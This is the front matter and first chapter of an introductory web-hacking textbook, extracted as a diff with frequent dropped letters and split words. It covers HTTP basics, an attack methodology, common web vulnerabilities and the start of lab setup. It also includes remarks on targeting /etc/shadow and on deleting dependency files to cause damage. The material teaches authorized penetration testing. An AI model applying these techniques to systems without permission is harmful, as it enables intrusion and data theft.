@@ -1,0 +1,1834 @@
+Acknowledgments
+Honey Bear
+To my wife, S amantha: We’ve come a long way since being scared teenagers expecting a
+baby! Your support no ma er the projects I take on, your understanding no ma er how
+much I complain, and your composure no ma er what comes at our family are legendary
+and have kept our family chugging along.
+
+Lizard
+To my oldest daughter, Liz: Your work ethic, a ention to detail, and drive to succeed are
+an inspiration to me. I ’m looking forward to the coming years as you take on your next
+challenges, as I have no doubt you will succeed with flying colors!
+
+Baby Bird
+To my youngest daughter, Maddie: Your smile and playful nature always pick me up and
+make me realize how good we have it. I f four open-heart surgeries won’t slow you down,
+what excuse does anybody else have? Keep smiling, playing, and being yourself—we’re
+all better off that way!
+
+Family and Friends
+
+Huge thanks to Merm, Tara, Halverto, S tacy & S teph, Luke & Tracy, D avid, D r. B, Cron
+my D S U students, and everybody else that I ’ve surely forgo en that have provided
+friendship and support. Salute!
+A nd a special note to D r. Patrick Engebretson, a great friend and colleague, that I ’ve
+shared many beers, fried goodies, stories, car rides, and oﬃce visits with. Your assistance
+through this publishing process has been a tremendous help. Do work, big boy!
+Last, to my parents, D r. Wayne and D r. Crystal Pauli: I t appears that those years of
+twisting my ear, ﬁlling my mouth full of soap, and breaking wooden spoons on my bu
+have ﬁnally paid oﬀ! (That stuﬀ was allowed in the 1980s and it’s obvious now that I
+wasn’t the easiest child to raise.) Your love and support have never wavered and I
+couldn’t ask for better parents.
+
+Security Community
+
+Man, what a group. I t doesn’t ma er if you’re a complete beginner, a super l33t hacker,
+or anywhere in between, you’re always welcome if you’re willing to learn and explore. A s
+a S outh D akota guy, I have my own personal “Mount Rushmore of S ecurity”: a group
+that not only is highly skilled in security but also has provided me with a ton support.
+■ To Dr. Jared DeMott: You’re one of the finest bug hunters/exploitation gurus in the
+world, but an even better family man and friend. With all your success it would be
+easy to forget about us “little people” at Dakota State University, but instead you’ve
+never been a bigger supporter of our mission and goals.
+■ To Dave Kennedy: HUGS! You’re one of the most encouraging security people that
+I’ve ever come across. The amount of fun you have working, training, speaking, and
+just hanging out with the security community is what this is all about. I’m glad our
+paths crossed and I look forward to many more years of watching you continue to
+flourish. MORE HUGS!
+■ To Eric Smith: I will never forget watching in awe as you dominated as a one-man red
+team for our security competition at DSU. Your personal story of hard work,
+dedication, and hours spent perfecting your craft is one that I’ve relayed to my
+students hundreds of times. Thanks for always making time to come back to Madison,
+SD, and furthering your demigod status with our students!
+■ To Dafydd Stuttard: I blame you for all of this! The Web Application Hacker’s Handbook
+(WAHH) that you authored with Marcus Pinto was one of the first premiere security
+books that I really dug into. After attending your classes, being the technical reviewer
+on the 2nd edition of WAHH, using your Burp Suite web application hacking tool
+extensively, and exchanging countless e-mails with you, it’s crystal clear that you’re
+the Godfather of web application security. I’ve educated over 400 students with
+WAHH and Burp Suite and hope my book can serve as an on-ramp to your super
+highway.
+
+Scott White—Technical Reviewer
+A special thanks to S co White for doing a tremendous job reviewing and cleaning up
+my work. With all the diﬀerent directions you get pulled and requests for your time, I
+truly appreciate your expertise, timeliness, and honest feedback. This book is much
+stronger because of your work!
+
+Syngress Team
+To all the ﬁne folks at S yngress that took a chance on me and provided nothing but the
+best in service, feedback, and critiques in an uber-timely manner. Especially, Chris
+Katsaropoulos and Ben Rearick—your professionalism and tact are greatly appreciated
+and are the way an organization should operate.
+
+My Vices
+
+I n no particular order, I ’d like to thank corndogs, Patron S ilver, HO TEL32 at the Mont
+Carlo in Las Vegas (especially @J ohnnyLasVegas and Pa y S anchez), Mickey’s mal
+liquor, fantasy football, Pringles, and my 6-iron for helping me recharge.
+
+Biography
+
+D r. J osh Pauli received his Ph.D . in software engineering from N orth D akota S tate
+University (N D S U) and now serves as an associate professor of cyber security at D akota
+S tate University (D S U) in Madison, S D . D r. Pauli has published nearly 30 internationa
+journal and conference papers related to software security and his work includes invited
+presentations from D EFCO N , Black Hat, and The N ational S ecurity A gency. He teache
+both undergraduate and graduate courses in software security at D S U and is the
+program director for the D S U Cyber Corps. D r. Pauli also conducts web application
+penetration tests for an information security consulting ﬁrm. You can keep up with J osh
+on Twi er by following @CornD ogGuy and visiting his D S U homepage at
+www.homepages.dsu.edu/paulij.
+
+Foreword
+
+The World Wide Web is a huge and expanding mass of application code. The majority of
+businesses, governments, and other organizations are now on the web, exposing their
+systems and data to the world via custom application functionality. With today’s
+development frameworks, it is easier than ever to create a functional web application
+without knowing or doing anything about security. With today’s technologies, that
+application is likely to be far more complex than those that have come before. Evolving
+technologies bring with them more a ack surface and new types of a ack. Meanwhile,
+old vulnerabilities live on and are reintroduced into new applications by each generation
+of coders.
+I n the recent past, numerous high-proﬁle organizations have been compromised via
+their web applications. Though their PR departments may claim they were victims of
+highly sophisticated hackers, in reality the majority of these a acks have exploited
+simple vulnerabilities that have been well understood for years. S maller companies that
+don’t feel under the spotlight may actually be even more exposed. A nd many who are
+compromised never know about it.
+Clearly, the subject of web application security is more critical today than ever before.
+There is a signiﬁcant need for more people to understand web application a acks, both
+on the oﬀensive side (to test existing applications for ﬂaws) and on the defensive side (to
+develop more robust code in the ﬁrst place). I f you’re completely new to web hacking,
+this book will get you started. A ssuming no existing knowledge, it will teach you the
+basic tools and techniques you need to ﬁnd and exploit numerous vulnerabilities in
+today’s applications. I f your job is to build or defend web applications, it will open your
+eyes to the a acks that your own applications are probably still vulnerable to and teach
+you how to prevent them from happening.
+Dafydd Stuttard
+Creator of Burp Suite
+Coauthor of The Web Application Hacker’s Handbook
+
+Introduction
+Many of us rely on web applications for so many of our daily tasks, whether at work, at
+home, or at play, and we access them several times a day from our laptops, tablets,
+phones, and other devices. We use these web applications to shop, bank, pay bills, a end
+online meetings, social network with friends and family, and countless other tasks. The
+problem is that web applications aren’t as secure as we’d like to think, and most of the
+time the a acks used to gain access to a web application are relatively straightforward
+and simple. I n fact, anyone can use widely available hacking tools to perform these
+devastating web attacks.
+This book will teach you how to hack web applications and what you can do to prevent
+these a acks. I t will walk you through the theory, tools, and techniques used to identify
+and exploit the most damaging web vulnerabilities present in current web applications.
+This means you will be able to make a web application perform actions it was never
+intended to perform, such as retrieve sensitive information from a database, bypass the
+login page, and assume the identity of other users. You’ll learn how to select a target,
+how to perform an a ack, what tools are needed and how to use them, and how to
+protect against these attacks.
+
+About This Book
+This book is designed to teach you the fundamentals of web hacking from the ground up.
+I t’s for those of you interested in ge ing started with web hacking but haven’t found a
+good resource. Basically, if you’re a web hacking newbie, this is the book for you! This
+book assumes you have no previous knowledge related to web hacking. Perhaps you have
+tinkered around with some of the tools, but you don’t fully understand how or where
+they fit into the larger picture of web hacking.
+Top web hacking experts have a ﬁrm grasp on programming, cryptography, bug
+hunting, exploitation development, database layout, data extraction, how network traﬃc
+works, and much more. I f you don’t have these skills, don’t be discouraged! These
+knowledge and skills are accumulated over the course of a career, and if you’re just
+ge ing started with web hacking, you probably won’t have all of these skills. This book
+will teach you the theory, tools, and techniques behind some of the most damaging web
+a acks present in modern web applications. You will gain not only knowledge and skill
+but also confidence to transition to even more complex web hacking in the future.
+
+A Hands-On Approach
+
+This book follows a very hands-on approach to introduce and demonstrate the content.
+Every chapter will have foundational knowledge so that you know the why of the a ack
+and detailed step-by-step directions so that you know the how of the attack.
+O ur approach to web hacking has three speciﬁc targets: the web server, the web
+application, and the web user. These targets all present diﬀerent vulnerabilities, so we
+need to use diﬀerent tools and techniques to exploit each of them. That’s exactly what
+this book will do; each chapter will introduce diﬀerent a acks that exploit these targets’
+vulnerabilities.
+
+What's in This Book?
+
+Each chapter covers the following material:
+Chapter 1: The Basics of Web Hacking provides an overview of current web
+vulnerabilities and how our hands-on approach takes aim at them.
+Chapter 2: Web S erver Hacking takes traditional network hacking methodologies and
+applies them directly to the web server to not only compromise those machines but also
+to provide a base of knowledge to use in a acks against the web application and web
+user. Tools include Nmap, Nessus, Nikto, and Metasploit.
+Chapter 3: Web A pplication Recon and S canning introduces tools, such as web proxies
+and scanning tools, which set the stage for you to exploit the targeted web application by
+ﬁnding existing vulnerabilities. Tools include Burp S uite (S pider and I ntercept) and Zed
+Attack Proxy (ZAP).
+Chapter 4: Web A pplication Exploitation with I njection covers the theory, tools, and
+techniques used to exploit web applications with S Q L injection, operating system
+command injection, and web shells. Tools include Burp S uite (speciﬁcally the functions
+and features of the Proxy I ntercept and Repeater tools), sqlmap, J ohn the Ripper (J tR)
+custom web shell files, and netcat.
+Chapter 5: Web A pplication Exploitation with Broken Authentication and Path
+Traversal covers the theory, tools, and techniques used to exploit web applications with
+brute forcing logins, sessions a acks, and forceful browsing. Tools include Burp S uite
+(I ntruder and S equencer) and various operating system commands for nefarious
+purposes.
+Chapter 6: Web User Hacking covers the theory, tools, and techniques used to exploit
+other web users by exploiting web application cross-site scripting (XS S ) and cross-site
+request forgery (CS RF) vulnerabilities as well as a acks that require no existing web
+server or web application vulnerabilities, but instead prey directly on the user’s
+willingness to complete dangerous actions. The main tool of choice will be S ocialEngineer Toolkit (SET).
+Chapter 7: Fixes covers the best practices available today to prevent all the a acks
+introduced in the book. Like most things security-related, the hard part is not identifying
+these mitigation strategies, but instead on how to best implement and test that they are
+doing what they are intended to do.
+Chapter 8: N ext S teps introduces where you can go after ﬁnishing this book to
+
+continue on your hacking journey. There are tons of great information security groups
+and events to take part in. S ome of you may want formal education, while others may
+want to know what certiﬁcations are especially applicable to this type of security work. A
+quick list of good books to consider is also provided.
+
+A Quick Disclaimer
+The goal of this book is to teach you how to penetrate web servers, web applications, and
+web users; protect against common a acks; and generally improve your understanding
+of what web application security is. I n a perfect world, no one would use the tools and
+techniques discussed in this book in an unethical manner. But since that’s not the case,
+keep the following in mind as you read along:
+Think before you hack.
+Don’t do malicious things.
+Don’t attack a target unless you have written permission.
+Many of the tools and techniques discussed in this book are easily detected and traced.
+I f you do something illegal, you could be sued or thrown into jail. O ne basic
+assumption this book makes is that you understand right from wrong. N either S yngress
+(this book’s publisher) nor I endorse using this book to do anything illegal. I f you break
+into someone's server or web application without permission, don’t come crying to me
+when your local law enforcement agency kicks your door in!
+
+C H AP T E R 1
+
+The Basics of Web Hacking
+
+Chapter Rundown:
+■ What you need to know about web servers and the HTTP protocol
+■ The Basics of Web Hacking: our approach
+■ Common web vulnerabilities: they are still owning us
+■ Setting up a safe test environment so you don’t go to jail
+
+Introduction
+
+There is a lot of ground to cover before you start to look at speciﬁc tools and how to
+conﬁgure and execute them to best suit your desires to exploit web applications. This
+chapter covers all the areas you need to be comfortable with before we get into these
+tools and techniques of web hacking. I n order to have the strong foundation you will
+need for many years of happy hacking, these are core fundamentals you need to fully
+understand and comprehend. These fundamentals include material related to the most
+common vulnerabilities that continue to plague the web even though some of them have
+been around for what seems like forever. S ome of the most damaging web application
+vulnerabilities “in the wild” are still as widespread and just as damaging over 10 years
+after being discovered.
+I t’s also important to understand the time and place for appropriate and ethnical use
+of the tools and techniques you will learn in the chapters that follow. A s one of my
+friends and colleagues likes to say about using hacking tools, “it’s all fun and games
+until the FBI shows up!” This chapter includes step-by-step guidance on preparing a
+sandbox (isolated environment) all of your own to provide a safe haven for your web
+hacking experiments.
+A s security moved more to the forefront of technology management, the overall
+security of our servers, networks, and services has greatly improved. This is in large part
+because of improved products such as ﬁrewalls and intrusion detection systems that
+secure the network layer. However, these devices do li le to protect the web application
+and the data that are used by the web application. A s a result, hackers shifted to
+a acking the web applications that directly interacted with all the internal systems, such
+as database servers, that were now being protected by ﬁrewalls and other network
+devices.
+I n the past handful of years, more emphasis has been placed on secure software
+development and, as a result, today’s web applications are much more secure than
+previous versions. There has been a strong push to include security earlier in the
+software development life cycle and to formalize the speciﬁcation of security
+requirements in a standardized way. There has also been a huge increase in the
+organization of several community groups dedicated to application security, such as the
+O pen Web A pplication S ecurity Project. There are still blatantly vulnerable web
+applications in the wild, mainly because programmers are more concerned about
+functionality than security, but the days of easily exploiting seemingly every web
+application are over.
+
+Therefore, because the security of the web application has also improved just like the
+network, the attack surface has again shifted; this time toward attacking web users. There
+is very li le that network administrators and web programmers can do to protect web
+users against these user-on-user a acks that are now so prevalent. I magine a hacker’s joy
+when he can now take aim on an unsuspecting technology-challenged user without
+having to worry about intrusion detection systems or web application logging and web
+application ﬁrewalls. A ackers are now focusing directly on the web users and
+eﬀectively bypassing any and all safeguards developed in the last 10 + years for networks
+and web applications.
+However, there are still plenty of existing viable a acks directed at web servers and
+web applications in addition to the a acks targeting web users. This book will cover how
+all of these a acks exploit the targeted web server, web application, and web user. You
+will fully understand how these a acks are conducted and what tools are needed to get
+the job done. Let’s do this!
+
+What Is a Web Application?
+The term “web application” has diﬀerent meanings to diﬀerent people. D epending on
+whom you talk to and the context, diﬀerent people will throw around terms like web
+application, web site, web-based system, web-based software or simply Web and all may
+have the same meaning. The widespread adoption of web applications actually makes it
+hard to clearly diﬀerentiate them from previous generation web sites that did nothing
+but serve up static, noninteractive HTML pages. The termweb application will be used
+throughout the book for any web-based software that performs actions (functionality)
+based on user input and usually interacts with backend systems. When a user interacts
+with a web site to perform some action, such as logging in or shopping or banking, it’s a
+web application.
+Relying on web applications for virtually everything we do creates a huge a ack
+surface (potential entry points) for web hackers. Throw in the fact that web applications
+are custom coded by a human programmer, thus increasing the likelihood of errors
+because despite the best of intentions. Humans get bored, hungry, tired, hung-over, or
+otherwise distracted and that can introduce bugs into the web application being
+developed. This is a perfect storm for hackers to exploit these web applications that we
+rely on so heavily.
+O ne might assume that a web application vulnerability is merely a human error that
+can be quickly ﬁxed by a programmer. N othing could be further from the truth: most
+vulnerabilities aren’t easily ﬁxed because many web application ﬂaws dates back to early
+phases of the software development lifecycle. I n an eﬀort to spare you the gory details of
+software engineering methodologies, just realize that security is much easier to deal with
+(and much more cost eﬀective) when considered initially in the planning and
+requirements phases of software development. S ecurity should continue as a driving
+force of the project all the way through design, construction, implementation, and
+testing.
+
+But alas, security is often treated as an afterthought too much of the time; this type of
+development leaves the freshly created web applications ripe with vulnerabilities that
+can be identified and exploited for a hacker’s own nefarious reasons.
+
+What You Need to Know About Web Servers
+
+A web server is just a piece of software running on the operating system of a server that
+allows connections to access a web application. The most common web servers are
+I nternet I nformation S ervices (I I S ) on a Windows server and A pache Hypertext Transfe
+Protocol (HTTP) S erver on a Linux server. These servers have normal directory structure
+like any other computer, and it’s these directories that house the web application.
+I f you follow the Windows next, next, next, ﬁnish approach to installing an I I S web
+server, you will end up with the default C:\Inetpub\wwwroot directory structure where
+each application will have its own directories within wwwroot and all vital web
+application resources are contained within it.
+Linux is more varied in the ﬁle structure, but most web applications are housed in the
+/var/www/ directory. There are several other directories on a Linux web server that are
+especially relevant to web hacking:
+■ /etc/shadow: This is where the password hashes for all users of the system reside. This
+is the “keys to the kingdom”!
+■ /usr/lib: This directory includes object files and internal binaries that are not intended
+to be executed by users or shell scripts. All dependency data used by the application
+will also reside in this directory. Although there is nothing executable here, you can
+really ruin somebody’s day by deleting all of the dependency files for an application.
+■ /var/*: This directory includes the files for databases, system logs, and the source code
+for web application itself!
+■ /bin: This directory contains programs that the system needs to operate, such as the
+shells, ls, grep, and other essential and important binaries. bin is short for binary.
+Most standard operating system commands are located here as separate executable
+binary files.
+The web server is a target for a acks itself because it oﬀers open ports and access to
+potentially vulnerable versions of web server software installed, vulnerable versions of
+other software installed, and misconﬁgurations of the operating system that it’s running
+on.
+
+What You Need to Know About HTTP
+
+The HTTP is the agreed upon process to interact and communicate with a web
+application. I t is completely plaintext protocol, so there is no assumption of security or
+privacy when using HTTP. HTTP is actually a stateless protocol, so every client reques
+and web application response is a brand new, independent event without knowledge of
+any previous requests. However, it’s critical that the web application keeps track of client
+requests so you can complete multistep transactions, such as online shopping where you
+
+add items to your shopping cart, select a shipping method, and enter payment
+information.
+HTTP without the use of cookies would require you to relogin during each of those
+steps. That is just not realistic, so the concept of a session was created where the
+application keeps track of your requests after you login. A lthough sessions are a great
+way to increase the user-friendliness of a web application, they also provide another
+a ack vector for web applications. HTTP was not originally created to handle the type of
+web transactions that requires a high degree of security and privacy. You can inspect all
+the gory details of how HTTP operates with tools such as Wireshark or any local HTTP
+proxy.
+The usage of secure HTTP (HTTPS ) does li le to stop the types of a acks that will b
+covered in this book. HTTPS is achieved when HTTP is layered on top of the S ecur
+S ocket Layer/Transport Layer S ecurity (S S L/TLS ) protocol, which adds the TLS
+S S L/TLS to normal HTTP request and responses. I t is best suited for ensuring man-in
+the-middle and other eavesdropping a acks are not successful; it ensures a “private call”
+between your browser and the web application as opposed to having a conversation in a
+crowded room where anybody can hear your secrets. However, in our usage, HTTPS just
+means we are going to be communicating with the web application over an encrypted
+communication channel to make it a private conversation. The bidirectional encryption
+of HTTPS will not stop our attacks from being processed by the waiting web application.
+
+HTTP Cycles
+O ne of the most important fundamental operations of every web application is the cycle
+of requests made by clients’ browsers and the responses returned by the web server. I t’s
+a very simple premise that happens many of times every day. A browser sends a request
+ﬁlled with parameters (variables) holding user input and the web server sends a
+response that is dictated by the submitted request. The web application may act based on
+the values of the parameters, so they are prime targets for hackers to a ack with
+malicious parameter values to exploit the web application and web server.
+
+Noteworthy HTTP Headers
+
+Each HTTP cycle also includes headers in both the client request and the server response
+that transmit details about the request or response. There are several of these headers,
+but we are only concerned with a few that are most applicable to our approach covered in
+this book.
+The headers that we are concerned about that are set by the web server and sent to the
+client’s browser as part of the response cycle are:
+■ Set-Cookie: This header most commonly provides the session identifier (cookie) to the
+client to ensure the user’s session stays current. If a hacker can steal a user’s session
+(by leveraging attacks covered in later chapters), they can assume the identity of the
+exploited user within the application.
+
+■ Content-Length: This header’s value is the length of the response body in bytes. This
+header is helpful to hackers because you can look for variation in the number of bytes
+of the response to help decipher the application’s response to input. This is especially
+applicable when conducting brute force (repetitive guessing) attacks.
+■ Location: This header is used when an application redirects a user to a new page. This
+is helpful to a hacker because it can be used to help identify pages that are only
+allowed after successfully authenticating to the application, for example.
+The headers that you should know more about that are sent by the client’s browser as
+part of the web request are:
+■ Cookie: This header sends the cookie (or several cookies) back to the server to maintain
+the user’s session. This cookie header value should always match the value of the setcookie header that was issued by the server. This header is helpful to hackers because
+it may provide a valid session with the application that can be used in attacks against
+other application users. Other cookies are not as juicy, such as a cookie that sets your
+desired language as English.
+■ Referrer: This header lists the webpage that the user was previously on when the next
+web request was made. Think of this header as storing the “the last page visited.” This
+is helpful to hackers because this value can be easily changed. Thus, if the application
+is relying on this header for any sense of security, it can easily be bypassed with a
+forged value.
+
+Noteworthy HTTP Status Codes
+
+A s web server responses are received by your browser, they will include a status code to
+signal what type of response it is. There are over 50 numerical HTTP response codes
+grouped into ﬁve families that provide similar type of status codes. Knowing what each
+type of response family represents allows you to gain an understanding of how your
+input was processed by the application.
+■ 100s: These responses are purely informational from the web server and usually mean
+that additional responses from the web server are forthcoming. These are rarely seen
+in modern web server responses and are usually followed close after with another
+type of response introduced below.
+■ 200s: These responses signal the client’s request was successfully accepted and
+processed by the web server and the response has been sent back to your browser.
+The most common HTTP status code is 200 OK.
+■ 300s: These responses are used to signal redirection where additional responses will
+be sent to the client. The most common implementation of this is to redirect a user’s
+browser to a secure homepage after successfully authenticating to the web
+application. This would actually be a 302 Redirect to send another response that
+would be delivered with a 200 OK.
+■ 400s: These responses are used to signal an error in the request from the client. This
+means the user has sent a request that can’t be processed by the web application,
+thus one of these common status codes is returned: 401 Unauthorized, 403 Forbidden,
+
+and 404 Not Found.
+■ 500s: These responses are used to signal an error on the server side. The most
+common status codes used in this family are the 500 Internal Server Error and 503
+Service Unavailable.
+Full details on all of the HTTP status codes can be reviewed in greater detail at
+http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html.
+
+The Basics of Web Hacking: Our Approach
+O ur approach is made up of four phases that cover all the necessary tasks during an
+attack.
+1. Reconnaissance
+2. Scanning
+3. Exploitation
+4. Fix
+I t’s appropriate to introduce and discuss how these vulnerabilities and a acks can be
+mitigated, thus there is a ﬁx phase to our approach. A s a penetration tester or ethical
+hacker, you will get several questions after the fact related to how the discovered
+vulnerabilities can be ﬁxed. Consider the inclusion of the ﬁx phase to be a resource to
+help answer those questions.
+
+Our Targets
+O ur approach targets three separate, yet related a ack vectors: the web server, the web
+application, and the web user. For the purpose of this book, we will deﬁne each of these
+attack vectors as follows:
+1. Web server: the application running on an operating system that is hosting the web
+application. We are NOT talking about traditional computer hardware here, but
+rather the services running on open ports that allow a web application to be
+reached by users’ internet browsers. The web server may be vulnerable to network
+hacking attempts targeting these services in order to gain unauthorized access to
+the web server’s file structure and system files.
+2. Web application: the actual source code running on the web server that provides the
+functionality that web users interact with is the most popular target for web
+hackers. The web application may be susceptible to a vast collection of attacks that
+attempt to perform unauthorized actions within the web application.
+3. Web user: the internal users that manage the web application (administrators and
+programmers) and the external users (human clients or customers) of the web
+applications are worthy targets of attacks. This is where a cross-site scripting (XSS)
+or cross-site request forgery (CSRF) vulnerabilities in the web application rear
+their ugly heads. Technical social engineering attacks that target web users and
+rely on no existing web application vulnerabilities are also applicable here.
+The vulnerabilities, exploits, and payloads are unique for each of these targets, so
+
+unique tools and techniques are needed to efficiently attack each of them.
+
+Our Tools
+For every tool used in this book, there are probably ﬁve other tools that can do the same
+job. (The same goes for methods, too.) We’ll emphasize the tools that are the most
+applicable to beginner web hackers. We recommend these tools not because they’re easy
+for beginners to use, but because they’re fundamental tools that virtually every
+professional penetration tester uses on a regular basis. I t’s paramount that you learn to
+use them from the very first day. Some of the tools that we’ll be using include:
+■ Burp Suite, which includes a host of top-notch web hacking tools, is a must-have for
+any web hacker and it’s widely accepted as the #1 web hacking tool collection.
+■ Zed Attack Proxy (ZAP) is similar to Burp Suite, but also includes a free vulnerability
+scanner that’s applicable to web applications.
+■ Network hacking tools such as Nmap for port scanning, Nessus and Nikto for
+vulnerability scanning, and Metasploit for exploitation of the web server.
+■ And other tools that fill a specific role such as sqlmap for SQL injection, John the Ripper
+(JtR) for offline password cracking, and the Social Engineering Toolkit (SET) for
+technical social engineering attacks against web users!
+
+Web Apps Touch Every Part of IT
+
+A nother exciting tidbit for web hackers is the fact that web applications interact with
+virtually every core system in a company’s infrastructure. I t’s commonplace to think that
+the web application is just some code running on a web server safely tucked away in an
+external D MZ incapable of doing serious internal damage to a company. There are
+several additional areas of a traditional I T infrastructure that need to be considered in
+order to fully target a system for a ack, because a web application’s reach is much wider
+than the code wri en by a programmer. The following components also need to be
+considered as possible attack vectors:
+■ Database server and database: the system that is hosting the database that the web
+application uses may be vulnerable to attacks that allow sensitive data to be created,
+read, updated, or deleted (CRUD).
+■ File server: the system, often times a mapped drive on a web server, that allows file
+upload and/or download functionality may be vulnerable to attacks that allow server
+resources to be accessed from an unauthorized attacker.
+■ Third-party, off-the-shelf components: modules of code, such as content management
+systems (CMSs), are a definitely a target because of the widespread adoption and
+available documentation of these systems.
+
+Existing Methodologies
+S everal a ack methodologies provide the processes, steps, tools, and techniques that are
+deemed to be best practices. I f you’re a white hat hacker, such activities are called
+penetration testing (pen test for short or PT for even shorter), but we all realize they are
+the same activities as black hat hacking. The two most widely accepted pen test
+methodologies today are the O pen-Source Security Testing M ethodology M anual(OSSTM)
+and the Penetration Testing Execution Standard (PTES).
+
+The Open-Source Security Testing Methodology
+Manual (OSSTM)
+
+The OSSTM was created in a peer review process that created cases that test five sections:
+1. Information and data controls
+2. Personnel security awareness levels
+3. Fraud and social engineering levels
+4. Computer and telecommunications networks, wireless devices, and mobile devices
+5. Physical security access controls, security process, and physical locations
+The O S S TM measures the technical details of each of these areas and provides
+guidance on what to do before, during, and after a security assessment. More
+information on the O S S TM can be found at the project homepage at
+http://www.isecom.org/research/osstmm.html.
+
+Penetration Testing Execution Standard (PTES)
+
+The new kid on the block is deﬁnitely the PTES , which is a new standard aimed at
+providing common language for all penetration testers and security assessment
+professionals to follow. PTES provides a client with a baseline of their own security
+posture, so they are in a be er position to make sense of penetration testing ﬁndings.
+PTES is designed as a minimum that needs to be completed as part of a comprehensive
+penetration test. The standard contains many diﬀerent levels of services that should be
+part of advanced penetration tests. More information can be found on the PTES
+homepage at http://www.pentest-standard.org/.
+
+Making Sense Of Existing Methodologies
+
+Because of the detailed processes, those standards are quite daunting to digest as a
+beginning hacker. Both of those standards basically cover every possible aspect of
+security testing, and they do a great job. Tons of very smart and talented people have
+dedicated countless hours to create standards for penetration testers and hackers to
+follow. Their eﬀorts are certainly commendable, but for beginning hackers it’s sensory
+overload. How are you going to consider hacking a wireless network when you may not
+even understand basic network hacking to begin with? How are you going to hack a
+mobile device that accesses a mobile version of a web application when you may not be
+comfortable with how dynamic web applications extract and use data from a database?
+What is needed is to boil down all the great information in standards such as the
+O S S TM and PTES into a more manageable methodology so that beginning hackers aren’
+overwhelmed. That’s the exact goal of this book. To give you the necessary guidance to
+get you started with the theory, tools, and techniques of web hacking!
+
+Most Common Web Vulnerabilities
+O ur targets will all be exploited by a acking well-understood vulnerabilities. A lthough
+there are several other web-related vulnerabilities, these are the ones we are going to
+concentrate on as we work through the chapters.
+
+Injection
+I njection ﬂaws occur when untrusted user data are sent to the web application as part of
+a command or query. The a acker’s hostile data can trick the web application into
+executing unintended commands or accessing unauthorized data. I njection occurs when
+a hacker feeds malicious, input into the web application that is then acted on (processed)
+in an unsafe manner. This is one of the oldest a acks against web applications, but it’s
+still the king of the vulnerabilities because it is still widespread and very damaging.
+I njection vulnerabilities can pop up in all sorts of places within the web application
+that allow the user to provide malicious input. S ome of the most common injection
+attacks target the following functionality:
+
+■ Structured query language (SQL) queries
+■ Lightweight directory access protocol (LDAP) queries
+■ XML path language (XPATH) queries
+■ Operating system (OS) commands
+A nytime that the user’s input is accepted by the web application and processed
+without the appropriate sanitization, injection may occur. This means that the hacker can
+inﬂuence how the web application’s queries and commands are constructed and what
+data should be included in the results. This is a very powerful exploit!
+
+Cross-Site Scripting (XSS)
+
+Cross-S ite S cripting (XS S ) occurs when user input is accepted by the application as part
+of a request and then is used in the output of the response without proper output
+encoding in place for validation and sanitization. XS S allows a ackers to execute scripts
+in the victim’s browser, which can hijack user sessions, act as a key logger, redirect the
+user to malicious sites, or anything else a hacker can dream up! A hacker can inject
+malicious script (often times J avaS cript, but it also could be VBS cript) that is then
+rendered in the browser of the victim. Because this script is part of the response from the
+application, the victim’s browser trusts it and allows the script to run.
+XS S comes in two primary “ﬂavors”: reﬂected and stored. Reﬂected XS S is much more
+widespread in web applications and is considered to be less harmful. The reason that
+reﬂected XS S is considered less harmful isn’t because of what it can do, but because it’s a
+one-time a ack where the payload sent in a reﬂected XS S a ack is only valid on that one
+request. Think of reﬂected XS S as “whoever clicks it, gets it.” Whatever user clicks the
+link that contains the malicious script will be the only person directly aﬀected by this
+a ack. I t is generally a 1:1 hacker to victim ratio. The hacker may send out the same
+malicious URL to millions of potential victims, but only the ones that click his link are
+going to be affected and there’s no connection between compromised users.
+Stored XSS is harder to find in web applications, but it’s much more damaging because
+it persists across multiple requests and can exploit numerous users with one a ack. This
+occurs when a hacker is able to inject the malicious script into the application and have it
+be available to all visiting users. I t may be placed in a database that is used to populate a
+webpage or in a user forum that displays messages or any other mechanism that stores
+input. A s legitimate users request the page, the XS S exploit will run in each of their
+browsers. This is a 1:many hacker to victim ratio.
+Both flavors of XSS have the same payloads; they are just delivered in different ways.
+
+Broken Authentication And Session Management
+S essions are the unique identiﬁers that are assigned to users after authenticating and
+have many vulnerabilities or attacks associated with how these identifiers are used by the
+web application. Sessions are also a key component of hacking the web user.
+A pplication functions related to authentication and session management are often not
+
+implemented correctly, allowing a ackers to compromise passwords, keys, session
+tokens, or exploit other implementation ﬂaws to assume other users’ identities.
+Functionality of the web application that is under the authentication umbrella also
+includes password reset, password change, and account recovery to name a few.
+A web application uses session management to keep track of each user’s requests.
+Without session management, you would have to log-in after every request you make.
+I magine logging in after you search for a product, then again when you want to add it to
+your shopping cart, then again when you want to check out, and then yet again when you
+want to supply your payment information. S o session management was created so users
+would only have to login once per visit and the web application would remember what
+user has added what products to the shopping cart. The bad news is that authentication
+and session management are afterthoughts compared to the original I nternet. There was
+no need for authentication and session management when there was no shopping or bill
+paying. S o the I nternet as we currently know it has been twisted and contorted to make
+use of authentication and session management.
+
+Cross-Site Request Forgery
+
+CS RF occurs when a hacker is able to send a well-crafted, yet malicious, request to an
+authenticated user that includes the necessary parameters (variables) to complete a valid
+application request without the victim (user) ever realizing it.
+This is similar to reﬂected XS S in that the hacker must coerce the victim to perform
+some action on the web application. Malicious script may still run in the victim’s
+browser, but CS RF may also perform a valid request made to the web application. S ome
+results of CS RF are changing a password, creating a new user, or creating web
+application content via a CMS . A s long as the hacker knows exactly what parameters are
+necessary to complete the request and the victim is authenticated to the application, the
+request will execute as if the user made it knowingly.
+
+Security Misconfiguration
+This vulnerability category speciﬁcally deals with the security (or lack thereof) of the
+entire application stack. For those not familiar with the term “application stack,” it refers
+to operating system, web server, and database management systems that run and are
+accessed by the actual web application code. The risk becomes even more problematic
+when security hardening practices aren’t followed to best protect the web server from
+unauthorized access. Examples of vulnerabilities that can plague the web server include:
+■ Out-of-date or unnecessary software
+■ Unnecessary services enabled
+■ Insecure account policies
+■ Verbose error messages
+Eﬀective security requires having a secure conﬁguration deﬁned and deployed for the
+application, frameworks, application server, web server, database server, and operating
+
+system. A ll these se ings should be deﬁned, implemented, and maintained, as many are
+not shipped with secure defaults. This includes keeping all software up to date, including
+all code libraries used by the application.
+
+Setting Up a Test Environment
+
+Before you dig into the tools and techniques covered in the book, it’s important that you
+set up a safe environment to use. Because this is an introductory hands-on book, we’ll
+practice all the techniques we cover on a vulnerable web application. There are three
+main requirements you need to consider when se ing up a testing environment as you
+work through the book.
+1. Because you will be hosting this vulnerable web application on your own
+computer, it’s critical that we configure it in a way that does not open your
+computer up for attack.
+2. You will be using hacking tools that are not authorized outside of your personal
+use, so it’s just as critical to have an environment that does not allow these tools to
+inadvertently escape.
